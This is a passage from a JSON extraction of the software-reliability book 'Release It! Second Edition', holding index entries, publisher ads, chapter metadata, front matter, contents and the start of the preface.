networking,\n\n187\n\nSolaris, network interface\n\nnames, 144\n\nspeculative retries, cascading\n\nfailures, 50\n\nspider integration points dia-\n\ngram, 33\n\nspiders\n\nsession bloat from, 285,\n\n287\n\nstability problems, 59–60\n\nSpinnaker, 243 Spirit rover, 290 splitting, see partitioning\n\nsplitting modular operator,\n\n308\n\nSplunk, 204 SQL injection, 216 SQLException\n\nairline case study, 20, 27 JDBC driver, 20 square-cube law, 71 Squid, 179 SSH ports, virtual machines\n\nin the cloud, 153\n\nstability, see also stability\n\nantipatterns; stability pat- terns\n\nchain of failure, 28–30 costs of poor stability, 23 defined, 24 failure modes, 26–28 global growth in users,\n\n31\n\ngrowth in complexity, 32 importance of, xiii, 23 longevity tests, 25 stopping crack propaga-\n\ntion, 27–29\n\nstability antipatterns, 31–90, see also slow responses; threads, blocked\n\ncascading failures, 48– 51, 85, 94, 98, 107 chain reactions, 46–49,\n\n68\n\ndogpile, 78–80, 211 force multiplier, 80–84,\n\n123, 194\n\nintegration points, 33–\n\n46, 94\n\nscaling effects, 71–75 self-denial attacks, 69–\n\n71, 76\n\nunbalanced capacities,\n\n75–78, 98, 112\n\nunbounded result sets,\n\n86–90, 94 users, 51–62\n\nstability patterns, 91–125, see also circuit breakers; timeouts\n\nback pressure, 76, 120–\n\n123\n\nbulkheads, 47, 49, 76,\n\n98–101\n\ndecoupling middleware, 45–46, 70, 117–119 fail fast, 86, 94, 106–108 governor, 123–125, 194,\n\n296\n\nIndex • 353\n\nhandshaking, 46, 76,\n\n111–113\n\nlet it crash, 108–111 load shedding, 119–120,\n\n122, 184\n\nsteady state, 89, 101–106 test harnesses, 45, 77,\n\n113–117\n\nstate\n\nglobal state and implicit\n\ncontext, 307\n\nimmutable infrastruc-\n\nture, 158\n\nlogging transitions, 169 steady state pattern, 89,\n\n101–106\n\nstatic assets, deployment\n\npreparation, 256\n\nstatic routes, 187 steady state\n\nstability pattern, 101–106 unbounded result sets,\n\n89\n\nstrain, defined, 25 stress\n\ndefined, 24 expensive transactions,\n\n56\n\nfail fast pattern, 107\n\nstress testing\n\nunbalanced capacities,\n\n78\n\nuser instability problems,\n\n62\n\nvendor libraries, 68\n\nStruts 2, 229 subnets, software-defined\n\nnetworking, 187\n\nsubscribe/publish messaging,\n\n73, 117\n\nsubstitution modular opera-\n\ntor, 310\n\nsubstitution principle, Liskov,\n\n65, 265\n\nsupervision tree, 109 supervisors, let it crash pat-\n\ntern, 109\n\nSwagger UI, 210 Sydney Opera House, 307 symlinks, 166 SYN/ACK packet, 37 synchronizing\n\nmethods on domain ob-\n\njects, 64–66\n\ntimeouts, 92\n\nsyslog, 204 system\n\nadaptation and system\n\narchitecture, 301–313\n\ndefined, 24 loose clustering, 305 self-contained systems,\n\n303\n\nsystem to system messag- ing and decoupling middleware, 117\n\nsystem-level transparen-\n\ncy, 163, 200–206\n\nsystem failures\n\ncascading failures, 49–51 queue backups, 182 slow processes vs. crash-\n\nes, 63–64\n\nT Taleb, Nassim, 328 TCP\n\n5 a.m. problem, 38–43 back pressure, 121 connection duration, 40 handshaking, 36, 111,\n\n183\n\nHTTP protocols and inte- gration point failures, 43\n\nintegration point failures,\n\n35–43\n\nload shedding, 119 multicasts, 73 networking basics, 36–38 number of socket connec-\n\ntors, 54\n\nqueue failures, 182 unbounded result sets,\n\n88\n\nvirtual IP addresses, 55\n\nThe TCP/IP Guide, 39 TCP/IP Illustrated, 39 tcpdump, 38, 40 teaming interfaces, 144 teams\n\nadoption teams, 294 assignments, 4 autonomy, 298 goals, 294 platform roles, 197–199,\n\n292–294, 299\n\ntransformation teams,\n\n294\n\ntechnology frontier, 32 terms of use, 60, 287\n\ntest harnesses\n\ncompared to mock ob-\n\njects, 114\n\nexplicit context, 307 framework, 116 integration point failures,\n\n45\n\nstability pattern, 113–117 unbalanced capacities,\n\n77\n\ntesting, see also integration testing; test harnesses\n\nBlack Friday diagnostic\n\ntests, 135\n\ncontract tests, 267, 272 database changes, 251,\n\n254\n\ndeveloping for, 279 environment, 251 expensive transactions,\n\n56\n\nexplicit context, 307 failure injection testing\n\n(FIT), 332\n\nfunctional, 45, 116 gap in ecommerce case\n\nstudy, 285 generative, 266 inbound, 266 integration point failures,\n\n45\n\nload, 26, 281–284 longevity tests, 25 overfocus on, 1 stress, 62, 68, 78 unbalanced capacities,\n\n77\n\nunit testing with mock\n\nobjects, 114\n\nthird-party authentication,\n\n221\n\nthrashing, 292 thread dumps\n\nBlack Friday case study,\n\n135\n\nfor postmortems, 16–18\n\nthreads, blocked\n\nairline case study, 27 back pressure, 121 cascading failures, 50, 68 chain reactions, 48, 68 metrics, 63 monitoring, 63 partitioning threads in- side a single process, 100\n\nreasons for, 63 slow network failures, 37\n\nIndex • 354\n\nslow processes vs. crash-\n\nes, 63–64\n\nstability antipattern, 62–\n\n69\n\nsynchronizing methods\n\non domain objects, 64– 66\n\ntimeouts, 92, 94 vendor libraries, 44, 67,\n\n69\n\nthrottling sessions, 286 TIME_WAIT, 55, 185 timeouts\n\nairline case study, 27 blocked threads, 68–69,\n\n92, 94\n\ncascading failures, 50,\n\n94, 107\n\nwith circuit breakers, 94,\n\n98\n\ncomplexity, 93 HTTP protocols, 43 integration point failures,\n\n46, 94\n\nlatency problems, 94 live control, 210 stability pattern, 91–95 TCP sockets, 37, 41 unbounded result sets,\n\n94\n\nvendor libraries, 68\n\nTLS certificates, 219, 230 toggles, feature, 210, 260 traffic, user stability antipat-\n\nterns, 51–55\n\ntransactions\n\ndefined, 24 expensive transactions\n\nand stability problems, 56\n\ntesting expensive transac-\n\ntions, 56\n\ntransformation teams, 294 translation pipeline, 252 Transmission Control Proto-\n\ncol, see TCP transparency\n\ndata collection, 163–170 designing for, 164 economic value, 200–201 instance-level, 162–170 logs and stats, 165–169,\n\n204–206\n\nreal-user monitoring,\n\n200–201\n\nrisk of fragmentation,\n\n203\n\nsystem-level, 163, 200–\n\n206\n\ntraversal attacks, directory,\n\n224\n\ntrickle, then batch migra-\n\ntions, 254–255\n\ntriggers, database, 250, 259 Tripwire, 232 trust stores, 219\n\nU UDP broadcasts, 73 UDP multicasts, 73 unbalanced capacities\n\ncircuit breakers, 98 handshaking, 76, 112 stability antipattern, 75–\n\n78\n\nunbounded result sets, 86–\n\n90, 94\n\nunit testing and mock ob-\n\njects, 114\n\nUNIX\n\nJava thread dumps, 16 log file accumulation, 103 network interface names,\n\n144\n\nsymlinks for log files, 166 uploads and directory traver-\n\nsal attacks, 224\n\nURLs\n\nauthorizing access to ob-\n\njects, 223\n\nbroken access control,\n\n222–224\n\ndualism, 318–321 probing, 223 session-sensitive, 223 version discriminator,\n\n269\n\nusers\n\nblacklists and whitelists,\n\n227\n\nexpensive transactions,\n\n56\n\ngrowth in social media,\n\n31, 88\n\njudging load capacity by\n\nconcurrent, 281\n\nmalicious, 60–62 metrics, 205 real-user monitoring and transparency, 200–201\n\nstability antipatterns, 51–\n\n62\n\ntraffic problems, 51–55 unwanted, 57–60\n\nV validations\n\ncache invalidation, 67,\n\n105\n\nfail fast pattern, 106\n\nVault, 226, 233 vaulting, 150, 232 vendors\n\nblocked threads from li- braries, 44, 67, 69\n\ndistributed denial-of-ser- vice (DDoS) products, 61\n\nintegration point failures,\n\n44\n\nversion control, 158, 161 VersionEye, 229 versioning, 263–273 deployment, 255 events, 315 handling others’ versions,\n\n270–273\n\nhandling own versions,\n\n263–270\n\nwith headers, 264, 269 supplying both old and new versions, 269\n\nusing numbers for debug-\n\nging, 268\n\nversion discriminator,\n\n269\n\nweb assets, 256\n\nvertical scaling, 46, see al-\n\nso scaling\n\nVIPs, see virtual IP addresses virtual IP addresses\n\nglobal server load balanc-\n\ning, 175\n\nload balancers, 178, 189 migratory, 189 sockets and traffic prob-\n\nlems, 55\n\nsoftware-defined network-\n\ning, 187\n\nvirtual LANs (VLANs), 149–\n\n150, 187\n\nvirtual extensible LANs\n\n(VXLANs), 150 virtual machines\n\nbulkheads, 98 clocks, 148\n\nIndex • 355\n\nin cloud, 152 configuration mapping,\n\n244\n\nelastic scaling and deploy-\n\nment tools, 208\n\nin foundation layer, 146–\n\n147, 152\n\npackaging, 245 separating out log files,\n\n166\n\nsoftware-defined network-\n\ning, 187\n\nVLANs, see virtual LANs VLANs (virtual LANs), 149–\n\n150, 187\n\nVolkswagen microbus para-\n\ndox, 328\n\nvoodoo operations, 167 VPNs, 186 VXLANs (virtual extensible\n\nLANs), 150\n\nW WannaCry ransomware, 215 weak references, 53–54, 67 web assets, deployment, 255 Weinberg, Gerald, 327 “‘What Do You Mean by ’Event-Driven’?”, 314 white-box technology, 164 whitelists, 227 Why People Believe Weird\n\nThings, 167\n\nWi-Fi and NICs, 143 Winchester “Mystery” House,\n\n307 Windows\n\nJava thread dumps, 16 memory dumps and secu-\n\nrity, 233\n\nnetwork interface names,\n\n144\n\nrotating log files, 104\n\nWireshark, 38, 40 working-set algorithms, 105\n\nX Xbox 360, 69 XML external entity (XXE) in-\n\njection, 217\n\nXML injection attacks, 217\n\nXSS (cross-site scripting),\n\n219, 221, 228\n\nXXE (XML external entity) in-\n\njection, 217\n\nY Yahoo! security breach, 215\n\nZ zombie apocalypse simula-\n\ntion, 335 ZooKeeper\n\nabout, 161, 188, 206 Reddit.com outage exam- ple, 80–83, 123, 196\n\nIndex • 356\n\nLevel Up\n\nFrom daily programming to architecture and design, level up your skills starting today.\n\nExercises for Programmers\n\nWhen you write software, you need to be at the top of your game. Great programmers practice to keep their skills sharp. Get sharp and stay sharp with more than fifty practice exercises rooted in real-world scenarios. If you’re a new programmer, these challenges will help you learn what you need to break into the field, and if you’re a seasoned pro, you can use these exercises to learn that hot new language for your next gig.\n\nBrian P. Hogan (118 pages) ISBN: 9781680501223. $24 https://pragprog.com/book/bhwb\n\nDesign It!\n\nDon’t engineer by coincidence—design it like you mean it! Grounded by fundamentals and filled with practical design methods, this is the perfect introduction to software architecture for programmers who are ready to grow their design skills. Ask the right stakeholders the right questions, explore design options, share your design decisions, and facilitate collaborative workshops that are fast, effective, and fun. Become a better pro- grammer, leader, and designer. Use your new skills to lead your team in implementing software with the right capabilities—and develop awesome software!\n\nMichael Keeling (358 pages) ISBN: 9781680502091. $41.95 https://pragprog.com/book/mkdsa\n\nMore on Python and Data Structures\n\nMore on data science and basic science, as well as Data Structures for everyone.\n\nData Science Essentials in Python\n\nGo from messy, unstructured artifacts stored in SQL and NoSQL databases to a neat, well-organized dataset with this quick reference for the busy data scientist. Understand text mining, machine learning, and net- work analysis; process numeric data with the NumPy and Pandas modules; describe and analyze data using statistical and network-theoretical methods; and see actual examples of data analysis at work. This one- stop solution covers the essential data science you need in Python.\n\nDmitry Zinoviev (224 pages) ISBN: 9781680501841. $29 https://pragprog.com/book/dzpyds\n\nA Common-Sense Guide to Data Structures and Algorithms\n\nIf you last saw algorithms in a university course or at a job interview, you’re missing out on what they can do for your code. Learn different sorting and searching techniques, and when to use each. Find out how to use recursion effectively. Discover structures for spe- cialized applications, such as trees and graphs. Use Big O notation to decide which algorithms are best for your production environment. Beginners will learn how to use these techniques from the start, and experienced developers will rediscover approaches they may have forgotten.\n\nJay Wengrow (218 pages) ISBN: 9781680502442. $45.95 https://pragprog.com/book/jwdsal\n\nThe Modern Web\n\nGet up to speed on the latest HTML, CSS, and JavaScript techniques, and secure your Node applications.\n\nHTML5 and CSS3 (2nd edition)\n\nHTML5 and CSS3 are more than just buzzwords – they’re the foundation for today’s web applications. This book gets you up to speed on the HTML5 elements and CSS3 features you can use right now in your cur- rent projects, with backwards compatible solutions that ensure that you don’t leave users of older browsers behind. This new edition covers even more new fea- tures, including CSS animations, IndexedDB, and client-side validations.\n\nBrian P. Hogan (314 pages) ISBN: 9781937785598. $38 https://pragprog.com/book/bhh52e\n\nSecure Your Node.js Web Application\n\nCyber-criminals have your web applications in their crosshairs. They search for and exploit common secu- rity mistakes in your web application to steal user data. Learn how you can secure your Node.js applications, database and web server to avoid these security holes. Discover the primary attack vectors against web appli- cations, and implement security best practices and effective countermeasures. Coding securely will make you a stronger web developer and analyst, and you’ll protect your users.\n\nKarl Düüna (230 pages) ISBN: 9781680500851. $36 https://pragprog.com/book/kdnodesec",
      "page_number": 354,
      "chapter_number": 43,
      "summary": "This chapter covers segment 43 (pages 354-361). Key topics include failures, session, and sessions.",
      "keywords": [
        "integration point failures",
        "session prediction attack",
        "Black Friday case",
        "Friday case study",
        "services service extinction",
        "unbounded result sets",
        "load stability pattern",
        "ecommerce case study",
        "airline case study",
        "fail fast pattern",
        "Amazon Web Services",
        "HTTP Strict Transport",
        "site case study",
        "ery services service",
        "case study"
      ],
      "concepts": [
        "failures",
        "session",
        "sessions",
        "deployment",
        "deployments",
        "stability",
        "attacks",
        "pattern",
        "design",
        "services"
      ],
      "similar_chapters": [
        {
          "book": "Reliable Machine Learning",
          "chapter": 35,
          "title": "Segment 35 (pages 301-308)",
          "relevance_score": 0.61,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 60,
          "title": "Segment 60 (pages 591-598)",
          "relevance_score": 0.6,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservices Up and Running",
          "chapter": 9,
          "title": "Segment 9 (pages 86-94)",
          "relevance_score": 0.58,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 4,
          "title": "Segment 4 (pages 27-35)",
          "relevance_score": 0.57,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 59,
          "title": "Segment 59 (pages 583-590)",
          "relevance_score": 0.56,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 44,
      "title": "Segment 44 (pages 362-366)",
      "start_page": 362,
      "end_page": 366,
      "detection_method": "topic_boundary",
      "content": "The Joy of Mazes and Math\n\nRediscover the joy and fascinating weirdness of mazes and pure mathematics.\n\nMazes for Programmers\n\nA book on mazes? Seriously?\n\nYes!\n\nNot because you spend your day creating mazes, or because you particularly like solving mazes.\n\nBut because it’s fun. Remember when programming used to be fun? This book takes you back to those days when you were starting to program, and you wanted to make your code do things, draw things, and solve puzzles. It’s fun because it lets you explore and grow your code, and reminds you how it feels to just think.\n\nSometimes it feels like you live your life in a maze of twisty little passages, all alike. Now you can code your way out.\n\nJamis Buck (286 pages) ISBN: 9781680500554. $38 https://pragprog.com/book/jbmaze\n\nGood Math\n\nMathematics is beautiful—and it can be fun and excit- ing as well as practical. Good Math is your guide to some of the most intriguing topics from two thousand years of mathematics: from Egyptian fractions to Tur- ing machines; from the real meaning of numbers to proof trees, group symmetry, and mechanical compu- tation. If you’ve ever wondered what lay beyond the proofs you struggled to complete in high school geom- etry, or what limits the capabilities of the computer on your desk, this is the book for you.\n\nMark C. Chu-Carroll (282 pages) ISBN: 9781937785338. $34 https://pragprog.com/book/mcmath\n\nPragmatic Programming\n\nWe’ll show you how to be more pragmatic and effective, for new code and old.\n\nYour Code as a Crime Scene\n\nJack the Ripper and legacy codebases have more in common than you’d think. Inspired by forensic psychol- ogy methods, this book teaches you strategies to pre- dict the future of your codebase, assess refactoring direction, and understand how your team influences the design. With its unique blend of forensic psychology and code analysis, this book arms you with the strategies you need, no matter what programming language you use.\n\nAdam Tornhill (218 pages) ISBN: 9781680500387. $36 https://pragprog.com/book/atcrime\n\nThe Nature of Software Development\n\nYou need to get value from your software project. You need it “free, now, and perfect.” We can’t get you there, but we can help you get to “cheaper, sooner, and bet- ter.” This book leads you from the desire for value down to the specific activities that help good Agile projects deliver better software sooner, and at a lower cost. Using simple sketches and a few words, the author invites you to follow his path of learning and under- standing from a half century of software development and from his engagement with Agile methods from their very beginning.\n\nRon Jeffries (176 pages) ISBN: 9781941222379. $24 https://pragprog.com/book/rjnsd\n\nThe Pragmatic Bookshelf\n\nThe Pragmatic Bookshelf features books written by developers for developers. The titles continue the well-known Pragmatic Programmer style and continue to garner awards and rave reviews. As development gets more and more difficult, the Pragmatic Programmers will be there with more titles and products to help you stay on top of your game.\n\nVisit Us Online\n\nThis Book’s Home Page https://pragprog.com/book/mnee2 Source code from this book, errata, and other resources. Come give us feedback, too!\n\nRegister for Updates https://pragprog.com/updates Be notified when updates and new books become available.\n\nJoin the Community https://pragprog.com/community Read our weblogs, join our online discussions, participate in our mailing list, interact with our wiki, and benefit from the experience of other Pragmatic Programmers.\n\nNew and Noteworthy https://pragprog.com/news Check out the latest pragmatic developments, new titles and other offerings.\n\nBuy the Book\n\nIf you liked this eBook, perhaps you’d like to have a paper copy of the book. It’s available for purchase at our store: https://pragprog.com/book/mnee2\n\nContact Us\n\nOnline Orders:\n\nhttps://pragprog.com/catalog\n\nCustomer Service:\n\nsupport@pragprog.com\n\nInternational Rights:\n\ntranslations@pragprog.com\n\nAcademic Use:\n\nacademic@pragprog.com\n\nWrite for Us:\n\nhttp://write-for-us.pragprog.com\n\nOr Call:\n\n+1 800-699-7764",
      "page_number": 362,
      "chapter_number": 44,
      "summary": "This one- stop solution covers the essential data science you need in Python Key topics include book, pages, and data. Data Science Essentials in Python\n\nGo from messy, unstructured artifacts stored in SQL and NoSQL databases to a neat, well-organized dataset with this quick reference for the busy data scientist.",
      "keywords": [
        "essential data science",
        "data science",
        "Data Structures",
        "Data",
        "ISBN",
        "book",
        "Pragmatic",
        "basic science",
        "Web",
        "pages",
        "Python",
        "science",
        "essential data",
        "code",
        "busy data scientist"
      ],
      "concepts": [
        "book",
        "pages",
        "data",
        "web",
        "applications",
        "application",
        "pragmatic",
        "developers",
        "developments",
        "code"
      ],
      "similar_chapters": [
        {
          "book": "Python Data Analysis 3rd",
          "chapter": 1,
          "title": "Preliminaries",
          "relevance_score": 0.78,
          "method": "sentence_transformers"
        },
        {
          "book": "Building LLM Powered Applications",
          "chapter": 34,
          "title": "Segment 34 (pages 283-291)",
          "relevance_score": 0.68,
          "method": "sentence_transformers"
        },
        {
          "book": "Python Cookbook 3rd",
          "chapter": 1,
          "title": "Data Structures and Algorithms",
          "relevance_score": 0.66,
          "method": "sentence_transformers"
        },
        {
          "book": "Effective-Python",
          "chapter": 1,
          "title": "Segment 1 (pages 2-9)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        },
        {
          "book": "Effective-Python",
          "chapter": 2,
          "title": "Segment 2 (pages 10-18)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        }
      ]
    }
  ],
  "pages": [
    {
      "page_number": 3,
      "content": "Early praise for Release It! Second Edition\n\nMike is one of the software industry’s deepest thinkers and clearest communica- tors. As beautifully written as the original, the second edition of Release It! extends the first with modern techniques—most notably continuous deployment, cloud infrastructure, and chaos engineering—that will help us all build and operate large-scale software systems.\n\n➤ Randy Shoup\n\nVP Engineering, Stitch Fix\n\nIf you are putting any kind of system into production, this is the single most im- portant book you should keep by your side. The author’s enormous experience in the area is captured in an easy-to-read, but still very intense, way. In this up- dated edition, the new ways of developing, orchestrating, securing, and deploying real-world services to different fabrics are well explained in the context of the core resiliency patterns.\n\n➤ Michael Hunger\n\nDirector of Developer Relations Engineering, Neo4j, Inc.\n\nSo much ground is covered here: patterns and antipatterns for application re- silience, security, operations, architecture. That breadth would be great in itself, but there’s tons of depth too. Don’t just read this book—study it.\n\n➤ Colin Jones\n\nCTO at 8th Light and Author of Mastering Clojure Macros",
      "content_length": 1252,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 4,
      "content": "Release It! is required reading for anyone who wants to run software to production and still sleep at night. It will help you build with confidence and learn to expect and embrace system failure.\n\n➤ Matthew White\n\nAuthor of Deliver Audacious Web Apps with Ember 2\n\nI would recommend this book to anyone working on a professional software project. Given that this edition has been fully updated to cover technologies and topics that are dealt with daily, I would expect everyone on my team to have a copy of this book to gain awareness of the breadth of topics that must be accounted for in modern-day software development.\n\n➤ Andy Keffalas\n\nSoftware Engineer/Team Lead\n\nA must-read for anyone wanting to build truly robust, scalable systems.\n\n➤ Peter Wood\n\nSoftware Programmer",
      "content_length": 776,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 5,
      "content": "Release It! Second Edition Design and Deploy Production-Ready Software\n\nMichael T. Nygard\n\nThe Pragmatic Bookshelf Raleigh, North Carolina",
      "content_length": 138,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 6,
      "content": "Many of the designations used by manufacturers and sellers to distinguish their products are claimed as trademarks. Where those designations appear in this book, and The Pragmatic Programmers, LLC was aware of a trademark claim, the designations have been printed in initial capital letters or in all capitals. The Pragmatic Starter Kit, The Pragmatic Programmer, Pragmatic Programming, Pragmatic Bookshelf, PragProg and the linking g device are trade- marks of The Pragmatic Programmers, LLC.\n\nEvery precaution was taken in the preparation of this book. However, the publisher assumes no responsibility for errors or omissions, or for damages that may result from the use of information (including program listings) contained herein.\n\nOur Pragmatic books, screencasts, and audio books can help you and your team create better software and have more fun. Visit us at https://pragprog.com.\n\nThe team that produced this book includes:\n\nPublisher: Andy Hunt VP of Operations: Janet Furlow Managing Editor: Brian MacDonald Supervising Editor: Jacquelyn Carter Development Editor: Katharine Dvorak Copy Editor: Molly McBeath Indexing: Potomac Indexing, LLC Layout: Gilson Graphics\n\nFor sales, volume licensing, and support, please contact support@pragprog.com.\n\nFor international rights, please contact rights@pragprog.com.\n\nCopyright © 2018 The Pragmatic Programmers, LLC. All rights reserved.\n\nNo part of this publication may be reproduced, stored in a retrieval system, or transmitted, in any form, or by any means, electronic, mechanical, photocopying, recording, or otherwise, without the prior consent of the publisher.\n\nPrinted in the United States of America. ISBN-13: 978-1-68050-239-8 Encoded using the finest acid-free high-entropy binary digits. Book version: P1.0—January 2018",
      "content_length": 1784,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 7,
      "content": "1.\n\n2.\n\n3.\n\nAcknowledgments\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nPreface .\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nLiving in Production . . Aiming for the Right Target The Scope of the Challenge A Million Dollars Here, a Million Dollars There Use the Force Pragmatic Architecture Wrapping Up\n\n.\n\n.\n\n.\n\n.\n\n.\n\nPart I — Create Stability\n\nCase Study: The Exception That Grounded an Airline . The Change Window The Outage Consequences Postmortem Hunting for Clues The Smoking Gun An Ounce of Prevention?\n\nStabilize Your System . Defining Stability Extending Your Life Span Failure Modes Stopping Crack Propagation Chain of Failure Wrapping Up\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nContents\n\n.\n\n.\n\n.\n\nxi\n\n.\n\n.\n\n.\n\nxiii\n\n.\n\n.\n\n.\n\n1 2 3 3 4 5 6\n\n.\n\n.\n\n9 10 12 14 14 16 18 20\n\n.\n\n.\n\n.\n\n23 24 25 26 27 28 30",
      "content_length": 760,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 8,
      "content": "4.\n\n5.\n\n6.\n\nStability Antipatterns Integration Points Chain Reactions Cascading Failures Users Blocked Threads Self-Denial Attacks Scaling Effects Unbalanced Capacities Dogpile Force Multiplier Slow Responses Unbounded Result Sets Wrapping Up\n\n.\n\n.\n\n.\n\n.\n\n.\n\nStability Patterns Timeouts Circuit Breaker Bulkheads Steady State Fail Fast Let It Crash Handshaking Test Harnesses Decoupling Middleware Shed Load Create Back Pressure Governor Wrapping Up\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nPart II — Design for Production\n\nCase Study: Phenomenal Cosmic Powers, . Itty-Bitty Living Space .\n\n.\n\n.\n\nBaby’s First Christmas Taking the Pulse Thanksgiving Day Black Friday Vital Signs Diagnostic Tests\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nContents • vi\n\n.\n\n31 33 46 49 51 62 69 71 75 78 80 84 86 90\n\n.\n\n91 91 95 98 101 106 108 111 113 117 119 120 123 125\n\n.\n\n129 130 131 132 132 134 135",
      "content_length": 855,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 9,
      "content": "Call In a Specialist Compare Treatment Options Does the Condition Respond to Treatment? Winding Down\n\n7.\n\nFoundations . Networking in the Data Center and the Cloud Physical Hosts, Virtual Machines, and Containers Wrapping Up\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n8.\n\nProcesses on Machines . Code Configuration Transparency Wrapping Up\n\n.\n\n.\n\n.\n\n.\n\n.\n\n9.\n\nInterconnect Solutions at Different Scales DNS Load Balancing Demand Control Network Routing Discovering Services Migratory Virtual IP Addresses Wrapping Up\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n10. Control Plane .\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nHow Much Is Right for You? Mechanical Advantage Platform and Ecosystem Development Is Production System-Wide Transparency Configuration Services Provisioning and Deployment Services Command and Control The Platform Players The Shopping List Wrapping Up\n\n11. Security\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nThe OWASP Top 10 The Principle of Least Privilege\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nContents • vii\n\n136 137 138 139\n\n.\n\n141 142 146 153\n\n.\n\n155 157 160 162 170\n\n.\n\n171 172 173 177 182 186 188 189 191\n\n.\n\n193 193 194 197 199 200 206 207 209 212 213 213\n\n.\n\n215 216 231",
      "content_length": 1137,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 10,
      "content": "Configured Passwords Security as an Ongoing Process Wrapping Up\n\nPart III — Deliver Your System\n\n12. Case Study: Waiting for Godot .\n\n.\n\n.\n\n.\n\n.\n\n13. Design for Deployment . So Many Machines The Fallacy of Planned Downtime Automated Deployments Continuous Deployment Phases of Deployment Deploy Like the Pros Wrapping Up\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n14. Handling Versions . .\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nHelp Others Handle Your Versions Handle Others’ Versions Wrapping Up\n\nPart IV — Solve Systemic Problems\n\n15. Case Study: Trampled by Your Own Customers . .\n\nCountdown and Launch Aiming for Quality Assurance Load Testing Murder by the Masses The Testing Gap Aftermath\n\n16. Adaptation .\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nConvex Returns Process and Organization System Architecture Information Architecture Wrapping Up\n\n17. Chaos Engineering . .\n\n17. Chaos Engineering . .\n\n. Breaking Things to Make Them Better\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nContents • viii\n\n232 233 233\n\n.\n\n237\n\n.\n\n241 241 242 242 246 248 261 261\n\n.\n\n263 263 270 273\n\n.\n\n277 277 278 281 284 285 286\n\n.\n\n289 289 290 301 313 324\n\n.\n\n325 325",
      "content_length": 1095,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 11,
      "content": "Antecedents of Chaos Engineering The Simian Army Adopting Your Own Monkey Disaster Simulations Wrapping Up\n\nBibliography\n\n.\n\n.\n\n.\n\n.\n\nIndex\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nContents • ix\n\n326 328 329 335 336\n\n.\n\n337\n\n.\n\n339",
      "content_length": 251,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 12,
      "content": "Acknowledgments\n\nI’d like to say a big thank you to the many people who have read and shared the first edition of Release It! I’m deeply happy that so many people have found it useful.\n\nOver the years, quite a few people have nudged me about updating this book. Thank you to Dion Stewart, Dave Thomas, Aino Corry, Kyle Larsen, John Allspaw, Stuart Halloway, Joanna Halloway, Justin Gehtland, Rich Hickey, Carin Meier, John Willis, Randy Shoup, Adrian Cockroft, Gene Kim, Dan North, Stefan Tilkov, and everyone else who saw that a few things had changed since we were building monoliths in 2006.\n\nThank you to all my technical reviewers: Adrian Cockcroft, Rod Hilton, Michael Hunger, Colin Jones, Andy Keffalas, Chris Nixon, Antonio Gomes Rodrigues, Stefan Turalski, Joshua White, Matthew White, Stephen Wolff, and Peter Wood. Your efforts and feedback have helped make this book much better.\n\nThanks also to Nora Jones and Craig Andera for letting me include your stories in these pages. The war stories have always been one of my favorite parts of the book, and I know many readers feel the same way.\n\nFinally, a huge thank you to Andy Hunt, Katharine Dvorak, Susannah Davidson Pfalzer, and the whole team at The Pragmatic Bookshelf. I appreciate your patience and perseverance.\n\nreport erratum • discuss",
      "content_length": 1305,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 13,
      "content": "Preface\n\nIn this book, you will examine ways to architect, design, and build software —particularly distributed systems—for the muck and mire of the real world. You will prepare for the armies of illogical users who do crazy, unpredictable things. Your software will be under attack from the moment you release it. It needs to stand up to the typhoon winds of flash mobs or the crushing pressure of a DDoS attack by poorly secured IoT toaster ovens. You’ll take a hard look at software that failed the test and find ways to make sure your software survives contact with the real world.\n\nWho Should Read This Book\n\nI’ve targeted this book to architects, designers, and developers of distributed software systems, including websites, web services, and EAI projects, among others. These must be available or the company loses money. Maybe they’re commerce systems that generate revenue directly through sales or critical internal systems that employees use to do their jobs. If anybody has to go home for the day because your software stops working, then this book is for you.\n\nHow This Book Is Organized\n\nThe book is divided into four parts, each introduced by a case study. Part I: Create Stability shows you how to keep your systems alive, maintaining system uptime. Despite promises of reliability through redundancy, distributed systems exhibit availability more like “two eights” rather than the coveted “five nines.” Stability is a necessary prerequisite to any other concerns. If your system falls over and dies every day, nobody cares about anything else. Short-term fixes— and short-term thinking—will dominate in that environment. There’s no viable future without stability, so we’ll start by looking at ways to make a stable base.\n\nAfter 